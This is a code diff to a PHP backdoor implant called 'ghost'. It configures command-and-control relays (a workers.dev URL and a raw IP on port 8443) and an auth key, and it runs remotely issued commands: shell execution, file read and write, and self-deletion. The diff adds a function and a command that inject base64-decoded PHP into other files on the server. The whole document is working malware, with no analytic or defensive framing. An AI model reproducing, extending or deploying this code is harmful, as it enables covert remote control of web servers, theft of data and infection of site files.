@@ -15,7 +15,7 @@ ignore_user_abort(true);
  * CONFIGURATION & SECURITY
  */
 $GHOST_CONFIG = array(
-    'primary_relay'  => 'https://gs-oyensc.your-subdomain.workers.dev',
+    'primary_relay'  => 'https://gs-oyensc.botoyen001.workers.dev',
     'fallback_relay' => 'http://13.213.138.250:8443',
     'auth_key'       => 'PREDATOR-X-2026-KINETIC-PRODUCTION',
     'agent_id'       => md5(php_uname('n') . get_current_user()),
@@ -110,6 +110,18 @@ function ghost_write_file($path, $b64_data) {
     return @file_put_contents($path, base64_decode($b64_data)) !== false ? "SUCCESS" : "ERROR";
 }
 
+function ghost_inject_php($path, $b64_payload, $position = 'append') {
+    if (!file_exists($path)) return "ERROR: NO_FILE: $path";
+    $content = @file_get_contents($path);
+    $payload = base64_decode($b64_payload);
+    if ($position === 'prepend') {
+        $content = $payload . "\n" . $content;
+    } else {
+        $content .= "\n" . $payload;
+    }
+    return @file_put_contents($path, $content) !== false ? "SUCCESS" : "ERROR";
+}
+
 /**
  * MAIN LOOP
  */
@@ -139,6 +151,7 @@ function ghost_main() {
                     case 'exec': $output = ghost_exec($args['cmd']); break;
                     case 'read': $output = ghost_read_file($args['path']); break;
                     case 'write': $output = ghost_write_file($args['path'], $args['data']); break;
+                    case 'inject': $output = ghost_inject_php($args['path'], $args['data'], isset($args['pos']) ? $args['pos'] : 'append'); break;
                     case 'cleanup': @unlink(__FILE__); exit();
                     default: $output = ghost_exec($payload); // Direct shell command
                 }
